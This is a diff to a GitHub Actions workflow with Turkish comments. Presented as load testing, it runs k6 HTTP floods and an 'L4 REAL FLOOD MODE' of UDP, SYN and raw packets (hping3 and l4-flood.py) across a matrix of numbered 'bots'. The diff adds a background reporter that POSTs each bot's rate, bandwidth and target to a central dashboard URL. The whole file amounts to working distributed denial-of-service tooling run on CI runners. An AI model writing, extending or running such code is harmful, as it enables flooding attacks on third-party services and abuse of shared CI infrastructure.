@@ -66,6 +66,11 @@ on:
           - l4
           - l4test
           - legacy
+      report_url:
+        description: 'Dashboard report URL (opsiyonel — canlı metrik için)'
+        required: false
+        default: ''
+        type: string
 
 jobs:
   loadtest:
@@ -177,18 +182,64 @@ jobs:
           RPS: ${{ inputs.rps_per_runner }}
           BOT_ID: ${{ matrix.bot_id }}
           HOST_HEADER: ${{ inputs.host_header }}
-          # k6 log opsiyonlari: her 5 saniyede periodik progress
+          REPORT_URL: ${{ inputs.report_url }}
+          ACCOUNT_NAME: ${{ github.repository_owner }}
           K6_LOG_OUTPUT: stdout
         run: |
           mkdir -p reports
           SCRIPT="${{ steps.script_select.outputs.script }}"
           echo "▶ Running: $SCRIPT"
           echo "▶ Mode: ${{ steps.script_select.outputs.mode_desc }}"
+          echo "▶ Report URL: ${REPORT_URL:-disabled}"
           echo ""
           echo "============================================================="
           echo "  CANLI DURUM (her ~5s'de [LIVE] satiri gelir)"
           echo "============================================================="
           echo ""
+
+          # Reporter background script — LIVE satirlarini parse edip dashboard'a POST eder
+          if [ -n "$REPORT_URL" ]; then
+            cat > /tmp/reporter.sh << 'REPORTER_EOF'
+          #!/bin/bash
+          LOGFILE="$1"
+          REPORT="$2"
+          BOTID="$3"
+          ACCOUNT="$4"
+          while true; do
+            sleep 5
+            [ ! -f "$LOGFILE" ] && continue
+            LAST=$(grep -E '\[LIVE' "$LOGFILE" 2>/dev/null | tail -1)
+            [ -z "$LAST" ] && continue
+            # L7: [LIVE bot=1] t=45s | iters=180523 | vus=4500 | rps~4011 | 2xx=87% 5xx=2% 429=0% | last=200
+            if echo "$LAST" | grep -q 'rps~'; then
+              ELAPSED=$(echo "$LAST" | grep -oP 't=\K\d+')
+              ITERS=$(echo "$LAST" | grep -oP 'iters=\K\d+')
+              VUS_N=$(echo "$LAST" | grep -oP 'vus=\K\d+')
+              RPS_N=$(echo "$LAST" | grep -oP 'rps~\K\d+')
+              P2XX=$(echo "$LAST" | grep -oP '2xx=\K\d+')
+              P5XX=$(echo "$LAST" | grep -oP '5xx=\K\d+')
+              P429=$(echo "$LAST" | grep -oP '429=\K\d+')
+              MBPS=$((RPS_N * 1400 * 8 / 1000000))
+              curl -sS -X POST "$REPORT" -H "Content-Type: application/json" \
+                -d "{\"bot_id\":\"$BOTID\",\"account\":\"$ACCOUNT\",\"type\":\"L7\",\"rps\":$RPS_N,\"mbps\":$MBPS,\"reqs\":$ITERS,\"vus\":$VUS_N,\"elapsed\":$ELAPSED,\"pct2xx\":${P2XX:-0},\"pct5xx\":${P5XX:-0},\"pct429\":${P429:-0},\"target\":\"$TARGET_URL\"}" \
+                -o /dev/null 2>/dev/null || true
+            fi
+            # L4: [LIVE L4 bot=1] t=60s | udp=4448000 raw=0 | pps=74133 | 830 Mbps (0.83 Gbps) | err=0
+            if echo "$LAST" | grep -q 'LIVE L4'; then
+              ELAPSED=$(echo "$LAST" | grep -oP 't=\K\d+')
+              UDP=$(echo "$LAST" | grep -oP 'udp=\K\d+')
+              RAW=$(echo "$LAST" | grep -oP 'raw=\K\d+')
+              PPS=$(echo "$LAST" | grep -oP 'pps=\K\d+')
+              MBPS=$(echo "$LAST" | grep -oP '\K\d+(?=\s*Mbps)')
+              TOTAL=$((UDP + RAW))
+              curl -sS -X POST "$REPORT" -H "Content-Type: application/json" \
+                -d "{\"bot_id\":\"$BOTID\",\"account\":\"$ACCOUNT\",\"type\":\"L4\",\"pps\":$PPS,\"mbps\":$MBPS,\"reqs\":$TOTAL,\"elapsed\":$ELAPSED,\"target\":\"$TARGET_URL\"}" \
+                -o /dev/null 2>/dev/null || true
+            fi
+          done
+          REPORTER_EOF
+            chmod +x /tmp/reporter.sh
+          fi
 
           # L4 test modu
           if [[ "${{ inputs.attack_mode }}" == "l4test" ]]; then
@@ -200,27 +251,56 @@ jobs:
           elif [[ "${{ inputs.attack_mode }}" == "l4" ]]; then
             echo ">>> L4 REAL FLOOD MODE (UDP + SYN + RAW) <<<"
             sudo apt-get install -y -qq hping3 2>/dev/null || true
-            sudo python3 -u .github/workflows/l4-flood.py
+            if [ -n "$REPORT_URL" ]; then
+              sudo python3 -u .github/workflows/l4-flood.py 2>&1 | tee /tmp/live.log &
+              K6PID=$!
+              bash /tmp/reporter.sh /tmp/live.log "$REPORT_URL" "$BOT_ID" "$ACCOUNT_NAME" &
+              wait $K6PID
+            else
+              sudo python3 -u .github/workflows/l4-flood.py
+            fi
             echo "L4 flood tamamlandi"
           elif [[ "${{ inputs.attack_mode }}" == "legacy" ]]; then
             RPS_ARG=$([[ "$RPS" -gt 0 ]] && echo "--rps $RPS" || echo "")
-            stdbuf -oL -eL k6 run \
-              --no-color \
-              --console-output=stdout \
-              --vus $VUS \
-              --duration $DURATION \
-              $RPS_ARG \
-              --tag bot_id=$BOT_ID \
-              --summary-export=reports/bot-${BOT_ID}-summary.json \
-              "$SCRIPT" || echo "k6 exited with code $?"
+            if [ -n "$REPORT_URL" ]; then
+              stdbuf -oL -eL k6 run \
+                --no-color --console-output=stdout \
+                --vus $VUS --duration $DURATION $RPS_ARG \
+                --tag bot_id=$BOT_ID \
+                --summary-export=reports/bot-${BOT_ID}-summary.json \
+                "$SCRIPT" 2>&1 | tee /tmp/live.log &
+              K6PID=$!
+              bash /tmp/reporter.sh /tmp/live.log "$REPORT_URL" "$BOT_ID" "$ACCOUNT_NAME" &
+              wait $K6PID
+            else
+              stdbuf -oL -eL k6 run \
+                --no-color --console-output=stdout \
+                --vus $VUS --duration $DURATION $RPS_ARG \
+                --tag bot_id=$BOT_ID \
+                --summary-export=reports/bot-${BOT_ID}-summary.json \
+                "$SCRIPT" || echo "k6 exited with code $?"
+            fi
           else
-            stdbuf -oL -eL k6 run \
-              --no-color \
-              --console-output=stdout \
-              --tag bot_id=$BOT_ID \
-              --summary-export=reports/bot-${BOT_ID}-summary-cli.json \
-              "$SCRIPT" || echo "k6 exited with code $?"
+            if [ -n "$REPORT_URL" ]; then
+              stdbuf -oL -eL k6 run \
+                --no-color --console-output=stdout \
+                --tag bot_id=$BOT_ID \
+                --summary-export=reports/bot-${BOT_ID}-summary-cli.json \
+                "$SCRIPT" 2>&1 | tee /tmp/live.log &
+              K6PID=$!
+              bash /tmp/reporter.sh /tmp/live.log "$REPORT_URL" "$BOT_ID" "$ACCOUNT_NAME" &
+              wait $K6PID
+            else
+              stdbuf -oL -eL k6 run \
+                --no-color --console-output=stdout \
+                --tag bot_id=$BOT_ID \
+                --summary-export=reports/bot-${BOT_ID}-summary-cli.json \
+                "$SCRIPT" || echo "k6 exited with code $?"
+            fi
           fi
+
+          # Reporter'ı durdur
+          pkill -f reporter.sh 2>/dev/null || true
 
           echo ""
           echo "═══ Bot #$BOT_ID artifact dosyaları ═══"
